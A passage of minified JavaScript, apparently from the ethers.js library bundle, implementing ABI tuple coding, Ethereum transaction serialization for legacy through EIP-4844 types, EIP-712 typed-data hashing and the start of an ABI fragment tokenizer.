        return super.encode(e, Fo(Uo.dereference(t, "string")))
    }
    decode(e) {
        return n7(super.decode(e))
    }
}
class lm extends Ka {
    constructor(t, o) {
        let i = !1;
        const n = [];
        t.forEach(a => {
            a.dynamic && (i = !0),
            n.push(a.type)
        }
        );
        const s = "tuple(" + n.join(",") + ")";
        super("tuple", s, o, i);
        we(this, "coders");
        tr(this, {
            coders: Object.freeze(t.slice())
        })
    }
    defaultValue() {
        const t = [];
        this.coders.forEach(i => {
            t.push(i.defaultValue())
        }
        );
        const o = this.coders.reduce( (i, n) => {
            const s = n.localName;
            return s && (i[s] || (i[s] = 0),
            i[s]++),
            i
        }
        , {});
        return this.coders.forEach( (i, n) => {
            let s = i.localName;
            !s || o[s] !== 1 || (s === "length" && (s = "_length"),
            t[s] == null && (t[s] = t[n]))
        }
        ),
        Object.freeze(t)
    }
    encode(t, o) {
        const i = Uo.dereference(o, "tuple");
        return iF(t, this.coders, i)
    }
    decode(t) {
        return sF(t, this.coders)
    }
}
function ls(r) {
    return ir(Fo(r))
}
function F2(r, e) {
    return {
        address: fi(r),
        storageKeys: e.map( (t, o) => (pe(ro(t, 32), "invalid slot", `storageKeys[${o}]`, t),
        t.toLowerCase()))
    }
}
function J1(r) {
    if (Array.isArray(r))
        return r.map( (t, o) => Array.isArray(t) ? (pe(t.length === 2, "invalid slot set", `value[${o}]`, t),
        F2(t[0], t[1])) : (pe(t != null && typeof t == "object", "invalid address-slot set", "value", r),
        F2(t.address, t.storageKeys)));
    pe(r != null && typeof r == "object", "invalid access list", "value", r);
    const e = Object.keys(r).map(t => {
        const o = r[t].reduce( (i, n) => (i[n] = !0,
        i), {});
        return F2(t, Object.keys(o).sort())
    }
    );
    return e.sort( (t, o) => t.address.localeCompare(o.address)),
    e
}
function Q1(r) {
    let e;
    return typeof r == "string" ? e = li.computePublicKey(r, !1) : e = r.publicKey,
    fi(ir("0x" + e.substring(4)).substring(26))
}
function kd(r, e) {
    return Q1(li.recoverPublicKey(r, e))
}
const Sn = BigInt(0)
  , Lde = BigInt(2)
  , $de = BigInt(27)
  , zde = BigInt(28)
  , jde = BigInt(35)
  , qde = BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
  , U2 = 4096 * 32;
function RR(r, e) {
    let t = r.toString(16);
    for (; t.length < 2; )
        t = "0" + t;
    return t += no(e).substring(4),
    "0x" + t
}
function ex(r) {
    return r === "0x" ? null : fi(r)
}
function l4(r, e) {
    try {
        return J1(r)
    } catch (t) {
        pe(!1, t.message, e, r)
    }
}
function W0(r, e) {
    return r === "0x" ? 0 : jn(r, e)
}
function tn(r, e) {
    if (r === "0x")
        return Sn;
    const t = Er(r, e);
    return pe(t <= qde, "value exceeds uint size", e, t),
    t
}
function Lr(r, e) {
    const t = Er(r, "value")
      , o = ho(t);
    return pe(o.length <= 32, "value too large", `tx.${e}`, t),
    o
}
function u4(r) {
    return J1(r).map(e => [e.address, e.storageKeys])
}
function Vde(r, e) {
    pe(Array.isArray(r), `invalid ${e}`, "value", r);
    for (let t = 0; t < r.length; t++)
        pe(ro(r[t], 32), "invalid ${ param } hash", `value[${t}]`, r[t]);
    return r
}
function Hde(r) {
    const e = G1(r);
    pe(Array.isArray(e) && (e.length === 9 || e.length === 6), "invalid field count for legacy transaction", "data", r);
    const t = {
        type: 0,
        nonce: W0(e[0], "nonce"),
        gasPrice: tn(e[1], "gasPrice"),
        gasLimit: tn(e[2], "gasLimit"),
        to: ex(e[3]),
        value: tn(e[4], "value"),
        data: et(e[5]),
        chainId: Sn
    };
    if (e.length === 6)
        return t;
    const o = tn(e[6], "v")
      , i = tn(e[7], "r")
      , n = tn(e[8], "s");
    if (i === Sn && n === Sn)
        t.chainId = o;
    else {
        let s = (o - jde) / Lde;
        s < Sn && (s = Sn),
        t.chainId = s,
        pe(s !== Sn || o === $de || o === zde, "non-canonical legacy v", "v", e[6]),
        t.signature = mo.from({
            r: qc(e[7], 32),
            s: qc(e[8], 32),
            v: o
        })
    }
    return t
}
function Gde(r, e) {
    const t = [Lr(r.nonce, "nonce"), Lr(r.gasPrice || 0, "gasPrice"), Lr(r.gasLimit, "gasLimit"), r.to || "0x", Lr(r.value, "value"), r.data];
    let o = Sn;
    if (r.chainId != Sn)
        o = Er(r.chainId, "tx.chainId"),
        pe(!e || e.networkV == null || e.legacyChainId === o, "tx.chainId/sig.v mismatch", "sig", e);
    else if (r.signature) {
        const n = r.signature.legacyChainId;
        n != null && (o = n)
    }
    if (!e)
        return o !== Sn && (t.push(ho(o)),
        t.push("0x"),
        t.push("0x")),
        Rd(t);
    let i = BigInt(27 + e.yParity);
    return o !== Sn ? i = mo.getChainIdV(o, e.v) : BigInt(e.v) !== i && pe(!1, "tx.chainId/sig.v mismatch", "sig", e),
    t.push(ho(i)),
    t.push(ho(e.r)),
    t.push(ho(e.s)),
    Rd(t)
}
function f4(r, e) {
    let t;
    try {
        if (t = W0(e[0], "yParity"),
        t !== 0 && t !== 1)
            throw new Error("bad yParity")
    } catch {
        pe(!1, "invalid yParity", "yParity", e[0])
    }
    const o = qc(e[1], 32)
      , i = qc(e[2], 32)
      , n = mo.from({
        r: o,
        s: i,
        yParity: t
    });
    r.signature = n
}
function Kde(r) {
    const e = G1(pt(r).slice(1));
    pe(Array.isArray(e) && (e.length === 9 || e.length === 12), "invalid field count for transaction type: 2", "data", et(r));
    const t = {
        type: 2,
        chainId: tn(e[0], "chainId"),
        nonce: W0(e[1], "nonce"),
        maxPriorityFeePerGas: tn(e[2], "maxPriorityFeePerGas"),
        maxFeePerGas: tn(e[3], "maxFeePerGas"),
        gasPrice: null,
        gasLimit: tn(e[4], "gasLimit"),
        to: ex(e[5]),
        value: tn(e[6], "value"),
        data: et(e[7]),
        accessList: l4(e[8], "accessList")
    };
    return e.length === 9 || f4(t, e.slice(9)),
    t
}
function Zde(r, e) {
    const t = [Lr(r.chainId, "chainId"), Lr(r.nonce, "nonce"), Lr(r.maxPriorityFeePerGas || 0, "maxPriorityFeePerGas"), Lr(r.maxFeePerGas || 0, "maxFeePerGas"), Lr(r.gasLimit, "gasLimit"), r.to || "0x", Lr(r.value, "value"), r.data, u4(r.accessList || [])];
    return e && (t.push(Lr(e.yParity, "yParity")),
    t.push(ho(e.r)),
    t.push(ho(e.s))),
    Ar(["0x02", Rd(t)])
}
function Yde(r) {
    const e = G1(pt(r).slice(1));
    pe(Array.isArray(e) && (e.length === 8 || e.length === 11), "invalid field count for transaction type: 1", "data", et(r));
    const t = {
        type: 1,
        chainId: tn(e[0], "chainId"),
        nonce: W0(e[1], "nonce"),
        gasPrice: tn(e[2], "gasPrice"),
        gasLimit: tn(e[3], "gasLimit"),
        to: ex(e[4]),
        value: tn(e[5], "value"),
        data: et(e[6]),
        accessList: l4(e[7], "accessList")
    };
    return e.length === 8 || f4(t, e.slice(8)),
    t
}
function Xde(r, e) {
    const t = [Lr(r.chainId, "chainId"), Lr(r.nonce, "nonce"), Lr(r.gasPrice || 0, "gasPrice"), Lr(r.gasLimit, "gasLimit"), r.to || "0x", Lr(r.value, "value"), r.data, u4(r.accessList || [])];
    return e && (t.push(Lr(e.yParity, "recoveryParam")),
    t.push(ho(e.r)),
    t.push(ho(e.s))),
    Ar(["0x01", Rd(t)])
}
function Jde(r) {
    let e = G1(pt(r).slice(1))
      , t = "3"
      , o = null;
    if (e.length === 4 && Array.isArray(e[0])) {
        t = "3 (network format)";
        const n = e[1]
          , s = e[2]
          , a = e[3];
        pe(Array.isArray(n), "invalid network format: blobs not an array", "fields[1]", n),
        pe(Array.isArray(s), "invalid network format: commitments not an array", "fields[2]", s),
        pe(Array.isArray(a), "invalid network format: proofs not an array", "fields[3]", a),
        pe(n.length === s.length, "invalid network format: blobs/commitments length mismatch", "fields", e),
        pe(n.length === a.length, "invalid network format: blobs/proofs length mismatch", "fields", e),
        o = [];
        for (let l = 0; l < e[1].length; l++)
            o.push({
                data: n[l],
                commitment: s[l],
                proof: a[l]
            });
        e = e[0]
    }
    pe(Array.isArray(e) && (e.length === 11 || e.length === 14), `invalid field count for transaction type: ${t}`, "data", et(r));
    const i = {
        type: 3,
        chainId: tn(e[0], "chainId"),
        nonce: W0(e[1], "nonce"),
        maxPriorityFeePerGas: tn(e[2], "maxPriorityFeePerGas"),
        maxFeePerGas: tn(e[3], "maxFeePerGas"),
        gasPrice: null,
        gasLimit: tn(e[4], "gasLimit"),
        to: ex(e[5]),
        value: tn(e[6], "value"),
        data: et(e[7]),
        accessList: l4(e[8], "accessList"),
        maxFeePerBlobGas: tn(e[9], "maxFeePerBlobGas"),
        blobVersionedHashes: e[10]
    };
    o && (i.blobs = o),
    pe(i.to != null, `invalid address for transaction type: ${t}`, "data", r),
    pe(Array.isArray(i.blobVersionedHashes), "invalid blobVersionedHashes: must be an array", "data", r);
    for (let n = 0; n < i.blobVersionedHashes.length; n++)
        pe(ro(i.blobVersionedHashes[n], 32), `invalid blobVersionedHash at index ${n}: must be length 32`, "data", r);
    return e.length === 11 || f4(i, e.slice(11)),
    i
}
function Qde(r, e, t) {
    const o = [Lr(r.chainId, "chainId"), Lr(r.nonce, "nonce"), Lr(r.maxPriorityFeePerGas || 0, "maxPriorityFeePerGas"), Lr(r.maxFeePerGas || 0, "maxFeePerGas"), Lr(r.gasLimit, "gasLimit"), r.to || oF, Lr(r.value, "value"), r.data, u4(r.accessList || []), Lr(r.maxFeePerBlobGas || 0, "maxFeePerBlobGas"), Vde(r.blobVersionedHashes || [], "blobVersionedHashes")];
    return e && (o.push(Lr(e.yParity, "yParity")),
    o.push(ho(e.r)),
    o.push(ho(e.s)),
    t) ? Ar(["0x03", Rd([o, t.map(i => i.data), t.map(i => i.commitment), t.map(i => i.proof)])]) : Ar(["0x03", Rd(o)])
}
var ks, nd, od, id, sd, ad, cd, ld, ud, fd, dd, hd, Jl, Uc, Ma, kc, pd, Im, Ui;
let cF = (Ui = class {
    constructor() {
        ft(this, pd);
        ft(this, ks);
        ft(this, nd);
        ft(this, od);
        ft(this, id);
        ft(this, sd);
        ft(this, ad);
        ft(this, cd);
        ft(this, ld);
        ft(this, ud);
        ft(this, fd);
        ft(this, dd);
        ft(this, hd);
        ft(this, Jl);
        ft(this, Uc);
        ft(this, Ma);
        ft(this, kc);
        He(this, ks, null),
        He(this, nd, null),
        He(this, id, 0),
        He(this, sd, Sn),
        He(this, ad, null),
        He(this, cd, null),
        He(this, ld, null),
        He(this, od, "0x"),
        He(this, ud, Sn),
        He(this, fd, Sn),
        He(this, dd, null),
        He(this, hd, null),
        He(this, Jl, null),
        He(this, Uc, null),
        He(this, kc, null),
        He(this, Ma, null)
    }
    get type() {
        return Ae(this, ks)
    }
    set type(e) {
        switch (e) {
        case null:
            He(this, ks, null);
            break;
        case 0:
        case "legacy":
            He(this, ks, 0);
            break;
        case 1:
        case "berlin":
        case "eip-2930":
            He(this, ks, 1);
            break;
        case 2:
        case "london":
        case "eip-1559":
            He(this, ks, 2);
            break;
        case 3:
        case "cancun":
        case "eip-4844":
            He(this, ks, 3);
            break;
        default:
            pe(!1, "unsupported transaction type", "type", e)
        }
    }
    get typeName() {
        switch (this.type) {
        case 0:
            return "legacy";
        case 1:
            return "eip-2930";
        case 2:
            return "eip-1559";
        case 3:
            return "eip-4844"
        }
        return null
    }
    get to() {
        const e = Ae(this, nd);
        return e == null && this.type === 3 ? oF : e
    }
    set to(e) {
        He(this, nd, e == null ? null : fi(e))
    }
    get nonce() {
        return Ae(this, id)
    }
    set nonce(e) {
        He(this, id, jn(e, "value"))
    }
    get gasLimit() {
        return Ae(this, sd)
    }
    set gasLimit(e) {
        He(this, sd, Er(e))
    }
    get gasPrice() {
        const e = Ae(this, ad);
        return e == null && (this.type === 0 || this.type === 1) ? Sn : e
    }
    set gasPrice(e) {
        He(this, ad, e == null ? null : Er(e, "gasPrice"))
    }
    get maxPriorityFeePerGas() {
        const e = Ae(this, cd);
        return e ?? (this.type === 2 || this.type === 3 ? Sn : null)
    }
    set maxPriorityFeePerGas(e) {
        He(this, cd, e == null ? null : Er(e, "maxPriorityFeePerGas"))
    }
    get maxFeePerGas() {
        const e = Ae(this, ld);
        return e ?? (this.type === 2 || this.type === 3 ? Sn : null)
    }
    set maxFeePerGas(e) {
        He(this, ld, e == null ? null : Er(e, "maxFeePerGas"))
    }
    get data() {
        return Ae(this, od)
    }
    set data(e) {
        He(this, od, et(e))
    }
    get value() {
        return Ae(this, ud)
    }
    set value(e) {
        He(this, ud, Er(e, "value"))
    }
    get chainId() {
        return Ae(this, fd)
    }
    set chainId(e) {
        He(this, fd, Er(e))
    }
    get signature() {
        return Ae(this, dd) || null
    }
    set signature(e) {
        He(this, dd, e == null ? null : mo.from(e))
    }
    get accessList() {
        const e = Ae(this, hd) || null;
        return e ?? (this.type === 1 || this.type === 2 || this.type === 3 ? [] : null)
    }
    set accessList(e) {
        He(this, hd, e == null ? null : J1(e))
    }
    get maxFeePerBlobGas() {
        const e = Ae(this, Jl);
        return e == null && this.type === 3 ? Sn : e
    }
    set maxFeePerBlobGas(e) {
        He(this, Jl, e == null ? null : Er(e, "maxFeePerBlobGas"))
    }
    get blobVersionedHashes() {
        let e = Ae(this, Uc);
        return e == null && this.type === 3 ? [] : e
    }
    set blobVersionedHashes(e) {
        if (e != null) {
            pe(Array.isArray(e), "blobVersionedHashes must be an Array", "value", e),
            e = e.slice();
            for (let t = 0; t < e.length; t++)
                pe(ro(e[t], 32), "invalid blobVersionedHash", `value[${t}]`, e[t])
        }
        He(this, Uc, e)
    }
    get blobs() {
        return Ae(this, kc) == null ? null : Ae(this, kc).map(e => Object.assign({}, e))
    }
    set blobs(e) {
        if (e == null) {
            He(this, kc, null);
            return
        }
        const t = []
          , o = [];
        for (let i = 0; i < e.length; i++) {
            const n = e[i];
            if (j1(n)) {
                Mt(Ae(this, Ma), "adding a raw blob requires a KZG library", "UNSUPPORTED_OPERATION", {
                    operation: "set blobs()"
                });
                let s = pt(n);
                if (pe(s.length <= U2, "blob is too large", `blobs[${i}]`, n),
                s.length !== U2) {
                    const f = new Uint8Array(U2);
                    f.set(s),
                    s = f
                }
                const a = Ae(this, Ma).blobToKzgCommitment(s)
                  , l = et(Ae(this, Ma).computeBlobKzgProof(s, a));
                t.push({
                    data: et(s),
                    commitment: et(a),
                    proof: l
                }),
                o.push(RR(1, a))
            } else {
                const s = et(n.commitment);
                t.push({
                    data: et(n.data),
                    commitment: s,
                    proof: et(n.proof)
                }),
                o.push(RR(1, s))
            }
        }
        He(this, kc, t),
        He(this, Uc, o)
    }
    get kzg() {
        return Ae(this, Ma)
    }
    set kzg(e) {
        He(this, Ma, e)
    }
    get hash() {
        return this.signature == null ? null : ir(Dt(this, pd, Im).call(this, !0, !1))
    }
    get unsignedHash() {
        return ir(this.unsignedSerialized)
    }
    get from() {
        return this.signature == null ? null : kd(this.unsignedHash, this.signature)
    }
    get fromPublicKey() {
        return this.signature == null ? null : li.recoverPublicKey(this.unsignedHash, this.signature)
    }
    isSigned() {
        return this.signature != null
    }
    get serialized() {
        return Dt(this, pd, Im).call(this, !0, !0)
    }
    get unsignedSerialized() {
        return Dt(this, pd, Im).call(this, !1, !1)
    }
    inferType() {
        const e = this.inferTypes();
        return e.indexOf(2) >= 0 ? 2 : e.pop()
    }
    inferTypes() {
        const e = this.gasPrice != null
          , t = this.maxFeePerGas != null || this.maxPriorityFeePerGas != null
          , o = this.accessList != null
          , i = Ae(this, Jl) != null || Ae(this, Uc);
        this.maxFeePerGas != null && this.maxPriorityFeePerGas != null && Mt(this.maxFeePerGas >= this.maxPriorityFeePerGas, "priorityFee cannot be more than maxFee", "BAD_DATA", {
            value: this
        }),
        Mt(!t || this.type !== 0 && this.type !== 1, "transaction type cannot have maxFeePerGas or maxPriorityFeePerGas", "BAD_DATA", {
            value: this
        }),
        Mt(this.type !== 0 || !o, "legacy transaction cannot have accessList", "BAD_DATA", {
            value: this
        });
        const n = [];
        return this.type != null ? n.push(this.type) : t ? n.push(2) : e ? (n.push(1),
        o || n.push(0)) : o ? (n.push(1),
        n.push(2)) : (i && this.to || (n.push(0),
        n.push(1),
        n.push(2)),
        n.push(3)),
        n.sort(),
        n
    }
    isLegacy() {
        return this.type === 0
    }
    isBerlin() {
        return this.type === 1
    }
    isLondon() {
        return this.type === 2
    }
    isCancun() {
        return this.type === 3
    }
    clone() {
        return Ui.from(this)
    }
    toJSON() {
        const e = t => t == null ? null : t.toString();
        return {
            type: this.type,
            to: this.to,
            data: this.data,
            nonce: this.nonce,
            gasLimit: e(this.gasLimit),
            gasPrice: e(this.gasPrice),
            maxPriorityFeePerGas: e(this.maxPriorityFeePerGas),
            maxFeePerGas: e(this.maxFeePerGas),
            value: e(this.value),
            chainId: e(this.chainId),
            sig: this.signature ? this.signature.toJSON() : null,
            accessList: this.accessList
        }
    }
    static from(e) {
        if (e == null)
            return new Ui;
        if (typeof e == "string") {
            const o = pt(e);
            if (o[0] >= 127)
                return Ui.from(Hde(o));
            switch (o[0]) {
            case 1:
                return Ui.from(Yde(o));
            case 2:
                return Ui.from(Kde(o));
            case 3:
                return Ui.from(Jde(o))
            }
            Mt(!1, "unsupported transaction type", "UNSUPPORTED_OPERATION", {
                operation: "from"
            })
        }
        const t = new Ui;
        return e.type != null && (t.type = e.type),
        e.to != null && (t.to = e.to),
        e.nonce != null && (t.nonce = e.nonce),
        e.gasLimit != null && (t.gasLimit = e.gasLimit),
        e.gasPrice != null && (t.gasPrice = e.gasPrice),
        e.maxPriorityFeePerGas != null && (t.maxPriorityFeePerGas = e.maxPriorityFeePerGas),
        e.maxFeePerGas != null && (t.maxFeePerGas = e.maxFeePerGas),
        e.maxFeePerBlobGas != null && (t.maxFeePerBlobGas = e.maxFeePerBlobGas),
        e.data != null && (t.data = e.data),
        e.value != null && (t.value = e.value),
        e.chainId != null && (t.chainId = e.chainId),
        e.signature != null && (t.signature = mo.from(e.signature)),
        e.accessList != null && (t.accessList = e.accessList),
        e.blobVersionedHashes != null && (t.blobVersionedHashes = e.blobVersionedHashes),
        e.kzg != null && (t.kzg = e.kzg),
        e.blobs != null && (t.blobs = e.blobs),
        e.hash != null && (pe(t.isSigned(), "unsigned transaction cannot define '.hash'", "tx", e),
        pe(t.hash === e.hash, "hash mismatch", "tx", e)),
        e.from != null && (pe(t.isSigned(), "unsigned transaction cannot define '.from'", "tx", e),
        pe(t.from.toLowerCase() === (e.from || "").toLowerCase(), "from mismatch", "tx", e)),
        t
    }
}
,
ks = new WeakMap,
nd = new WeakMap,
od = new WeakMap,
id = new WeakMap,
sd = new WeakMap,
ad = new WeakMap,
cd = new WeakMap,
ld = new WeakMap,
ud = new WeakMap,
fd = new WeakMap,
dd = new WeakMap,
hd = new WeakMap,
Jl = new WeakMap,
Uc = new WeakMap,
Ma = new WeakMap,
kc = new WeakMap,
pd = new WeakSet,
Im = function(e, t) {
    Mt(!e || this.signature != null, "cannot serialize unsigned transaction; maybe you meant .unsignedSerialized", "UNSUPPORTED_OPERATION", {
        operation: ".serialized"
    });
    const o = e ? this.signature : null;
    switch (this.inferType()) {
    case 0:
        return Gde(this, o);
    case 1:
        return Xde(this, o);
    case 2:
        return Zde(this, o);
    case 3:
        return Qde(this, o, t ? this.blobs : null)
    }
    Mt(!1, "unsupported transaction type", "UNSUPPORTED_OPERATION", {
        operation: ".serialized"
    })
}
,
Ui);
function ehe(r) {
    return typeof r == "string" && (r = Fo(r)),
    ir(Ar([Fo(wde), Fo(String(r.length)), r]))
}
const lF = new Uint8Array(32);
lF.fill(0);
const the = BigInt(-1)
  , uF = BigInt(0)
  , fF = BigInt(1)
  , rhe = BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
function nhe(r) {
    const e = pt(r)
      , t = e.length % 32;
    return t ? Ar([e, lF.slice(t)]) : et(e)
}
const ohe = cs(fF, 32)
  , ihe = cs(uF, 32)
  , WR = {
    name: "string",
    version: "string",
    chainId: "uint256",
    verifyingContract: "address",
    salt: "bytes32"
}
  , k2 = ["name", "version", "chainId", "verifyingContract", "salt"];
function MR(r) {
    return function(e) {
        return pe(typeof e == "string", `invalid domain value for ${JSON.stringify(r)}`, `domain.${r}`, e),
        e
    }
}
const she = {
    name: MR("name"),
    version: MR("version"),
    chainId: function(r) {
        const e = Er(r, "domain.chainId");
        return pe(e >= 0, "invalid chain ID", "domain.chainId", r),
        Number.isSafeInteger(e) ? Number(e) : t7(e)
    },
    verifyingContract: function(r) {
        try {
            return fi(r).toLowerCase()
        } catch {}
        pe(!1, 'invalid domain value "verifyingContract"', "domain.verifyingContract", r)
    },
    salt: function(r) {
        const e = pt(r, "domain.salt");
        return pe(e.length === 32, 'invalid domain value "salt"', "domain.salt", r),
        et(e)
    }
};
function L2(r) {
    {
        const e = r.match(/^(u?)int(\d+)$/);
        if (e) {
            const t = e[1] === ""
              , o = parseInt(e[2]);
            pe(o % 8 === 0 && o !== 0 && o <= 256 && e[2] === String(o), "invalid numeric width", "type", r);
            const i = Hf(rhe, t ? o - 1 : o)
              , n = t ? (i + fF) * the : uF;
            return function(s) {
                const a = Er(s, "value");
                return pe(a >= n && a <= i, `value out-of-bounds for ${r}`, "value", a),
                cs(t ? Z3(a, 256) : a, 32)
            }
        }
    }
    {
        const e = r.match(/^bytes(\d+)$/);
        if (e) {
            const t = parseInt(e[1]);
            return pe(t !== 0 && t <= 32 && e[1] === String(t), "invalid bytes width", "type", r),
            function(o) {
                const i = pt(o);
                return pe(i.length === t, `invalid length for ${r}`, "value", o),
                nhe(o)
            }
        }
    }
    switch (r) {
    case "address":
        return function(e) {
            return qc(fi(e), 32)
        }
        ;
    case "bool":
        return function(e) {
            return e ? ohe : ihe
        }
        ;
    case "bytes":
        return function(e) {
            return ir(e)
        }
        ;
    case "string":
        return function(e) {
            return ls(e)
        }
    }
    return null
}
function NR(r, e) {
    return `${r}(${e.map( ({name: t, type: o}) => o + " " + t).join(",")})`
}
function um(r) {
    const e = r.match(/^([^\x5b]*)((\x5b\d*\x5d)*)(\x5b(\d*)\x5d)$/);
    return e ? {
        base: e[1],
        index: e[2] + e[4],
        array: {
            base: e[1],
            prefix: e[1] + e[2],
            count: e[5] ? parseInt(e[5]) : -1
        }
    } : {
        base: r
    }
}
var n0, Na, gd, m1, dF, lo;
let DR = (lo = class {
    constructor(e) {
        ft(this, m1);
        we(this, "primaryType");
        ft(this, n0);
        ft(this, Na);
        ft(this, gd);
        He(this, Na, new Map),
        He(this, gd, new Map);
        const t = new Map
          , o = new Map
          , i = new Map
          , n = {};
        Object.keys(e).forEach(l => {
            n[l] = e[l].map( ({name: f, type: h}) => {
                let {base: p, index: b} = um(h);
                return p === "int" && !e.int && (p = "int256"),
                p === "uint" && !e.uint && (p = "uint256"),
                {
                    name: f,
                    type: p + (b || "")
                }
            }
            ),
            t.set(l, new Set),
            o.set(l, []),
            i.set(l, new Set)
        }
        ),
        He(this, n0, JSON.stringify(n));
        for (const l in n) {
            const f = new Set;
            for (const h of n[l]) {
                pe(!f.has(h.name), `duplicate variable name ${JSON.stringify(h.name)} in ${JSON.stringify(l)}`, "types", e),
                f.add(h.name);
                const p = um(h.type).base;
                pe(p !== l, `circular type reference to ${JSON.stringify(p)}`, "types", e),
                !L2(p) && (pe(o.has(p), `unknown type ${JSON.stringify(p)}`, "types", e),
                o.get(p).push(l),
                t.get(l).add(p))
            }
        }
        const s = Array.from(o.keys()).filter(l => o.get(l).length === 0);
        pe(s.length !== 0, "missing primary type", "types", e),
        pe(s.length === 1, `ambiguous primary types or unused types: ${s.map(l => JSON.stringify(l)).join(", ")}`, "types", e),
        tr(this, {
            primaryType: s[0]
        });
        function a(l, f) {
            pe(!f.has(l), `circular type reference to ${JSON.stringify(l)}`, "types", e),
            f.add(l);
            for (const h of t.get(l))
                if (o.has(h)) {
                    a(h, f);
                    for (const p of f)
                        i.get(p).add(h)
                }
            f.delete(l)
        }
        a(this.primaryType, new Set);
        for (const [l,f] of i) {
            const h = Array.from(f);
            h.sort(),
            Ae(this, Na).set(l, NR(l, n[l]) + h.map(p => NR(p, n[p])).join(""))
        }
    }
    get types() {
        return JSON.parse(Ae(this, n0))
    }
    getEncoder(e) {
        let t = Ae(this, gd).get(e);
        return t || (t = Dt(this, m1, dF).call(this, e),
        Ae(this, gd).set(e, t)),
        t
    }
    encodeType(e) {
        const t = Ae(this, Na).get(e);
        return pe(t, `unknown type: ${JSON.stringify(e)}`, "name", e),
        t
    }
    encodeData(e, t) {
        return this.getEncoder(e)(t)
    }
    hashStruct(e, t) {
        return ir(this.encodeData(e, t))
    }
    encode(e) {
        return this.encodeData(this.primaryType, e)
    }
    hash(e) {
        return this.hashStruct(this.primaryType, e)
    }
    _visit(e, t, o) {
        if (L2(e))
            return o(e, t);
        const i = um(e).array;
        if (i)
            return pe(i.count === -1 || i.count === t.length, `array length mismatch; expected length ${i.count}`, "value", t),
            t.map(s => this._visit(i.prefix, s, o));
        const n = this.types[e];
        if (n)
            return n.reduce( (s, {name: a, type: l}) => (s[a] = this._visit(l, t[a], o),
            s), {});
        pe(!1, `unknown type: ${e}`, "type", e)
    }
    visit(e, t) {
        return this._visit(this.primaryType, e, t)
    }
    static from(e) {
        return new lo(e)
    }
    static getPrimaryType(e) {
        return lo.from(e).primaryType
    }
    static hashStruct(e, t, o) {
        return lo.from(t).hashStruct(e, o)
    }
    static hashDomain(e) {
        const t = [];
        for (const o in e) {
            if (e[o] == null)
                continue;
            const i = WR[o];
            pe(i, `invalid typed-data domain key: ${JSON.stringify(o)}`, "domain", e),
            t.push({
                name: o,
                type: i
            })
        }
        return t.sort( (o, i) => k2.indexOf(o.name) - k2.indexOf(i.name)),
        lo.hashStruct("EIP712Domain", {
            EIP712Domain: t
        }, e)
    }
    static encode(e, t, o) {
        return Ar(["0x1901", lo.hashDomain(e), lo.from(t).hash(o)])
    }
    static hash(e, t, o) {
        return ir(lo.encode(e, t, o))
    }
    static async resolveNames(e, t, o, i) {
        e = Object.assign({}, e);
        for (const a in e)
            e[a] == null && delete e[a];
        const n = {};
        e.verifyingContract && !ro(e.verifyingContract, 20) && (n[e.verifyingContract] = "0x");
        const s = lo.from(t);
        s.visit(o, (a, l) => (a === "address" && !ro(l, 20) && (n[l] = "0x"),
        l));
        for (const a in n)
            n[a] = await i(a);
        return e.verifyingContract && n[e.verifyingContract] && (e.verifyingContract = n[e.verifyingContract]),
        o = s.visit(o, (a, l) => a === "address" && n[l] ? n[l] : l),
        {
            domain: e,
            value: o
        }
    }
    static getPayload(e, t, o) {
        lo.hashDomain(e);
        const i = {}
          , n = [];
        k2.forEach(l => {
            const f = e[l];
            f != null && (i[l] = she[l](f),
            n.push({
                name: l,
                type: WR[l]
            }))
        }
        );
        const s = lo.from(t);
        t = s.types;
        const a = Object.assign({}, t);
        return pe(a.EIP712Domain == null, "types must not contain EIP712Domain type", "types.EIP712Domain", t),
        a.EIP712Domain = n,
        s.encode(o),
        {
            types: a,
            domain: i,
            primaryType: s.primaryType,
            message: s.visit(o, (l, f) => {
                if (l.match(/^bytes(\d*)/))
                    return et(pt(f));
                if (l.match(/^u?int/))
                    return Er(f).toString();
                switch (l) {
                case "address":
                    return f.toLowerCase();
                case "bool":
                    return !!f;
                case "string":
                    return pe(typeof f == "string", "invalid string", "value", f),
                    f
                }
                pe(!1, "unsupported type", "type", l)
            }
            )
        }
    }
}
,
n0 = new WeakMap,
Na = new WeakMap,
gd = new WeakMap,
m1 = new WeakSet,
dF = function(e) {
    {
        const i = L2(e);
        if (i)
            return i
    }
    const t = um(e).array;
    if (t) {
        const i = t.prefix
          , n = this.getEncoder(i);
        return s => {
            pe(t.count === -1 || t.count === s.length, `array length mismatch; expected length ${t.count}`, "value", s);
            let a = s.map(n);
            return Ae(this, Na).has(i) && (a = a.map(ir)),
            ir(Ar(a))
        }
    }
    const o = this.types[e];
    if (o) {
        const i = ls(Ae(this, Na).get(e));
        return n => {
            const s = o.map( ({name: a, type: l}) => {
                const f = this.getEncoder(l)(n[a]);
                return Ae(this, Na).has(l) ? ir(f) : f
            }
            );
            return s.unshift(i),
            Ar(s)
        }
    }
    pe(!1, `unknown type: ${e}`, "type", e)
}
,
lo);
function rh(r) {
    const e = new Set;
    return r.forEach(t => e.add(t)),
    Object.freeze(e)
}
const ahe = "external public payable override";
rh(ahe.split(" "));
const hF = "constant external internal payable private public pure view override";
rh(hF.split(" "));
const pF = "constructor error event fallback function receive struct";
rh(pF.split(" "));
const gF = "calldata memory storage payable indexed"
  , che = rh(gF.split(" "))
  , lhe = "tuple returns"
  , uhe = [pF, gF, lhe, hF].join(" ")
  , fhe = rh(uhe.split(" "))
  , dhe = {
    "(": "OPEN_PAREN",
    ")": "CLOSE_PAREN",
    "[": "OPEN_BRACKET",
    "]": "CLOSE_BRACKET",
    ",": "COMMA",
    "@": "AT"
}
  , hhe = new RegExp("^(\\s*)")
  , phe = new RegExp("^([0-9]+)")
  , ghe = new RegExp("^([a-zA-Z$_][a-zA-Z0-9$_]*)")
  , yhe = new RegExp("^([a-zA-Z$_][a-zA-Z0-9$_]*)$")
  , yF = new RegExp("^(address|bool|bytes([0-9]*)|string|u?int([0-9]*))$");
var Ln, ns, o0, vA, cu;
let bF = (cu = class {
    constructor(e) {
        ft(this, o0);
        ft(this, Ln);
        ft(this, ns);
        He(this, Ln, 0),
        He(this, ns, e.slice())
    }
    get offset() {
        return Ae(this, Ln)
    }
    get length() {
        return Ae(this, ns).length - Ae(this, Ln)
    }
    clone() {
        return new cu(Ae(this, ns))
    }
    reset() {
        He(this, Ln, 0)
    }
    popKeyword(e) {
        const t = this.peek();
        if (t.type !== "KEYWORD" || !e.has(t.text))
            throw new Error(`expected keyword ${t.text}`);
        return this.pop().text
    }
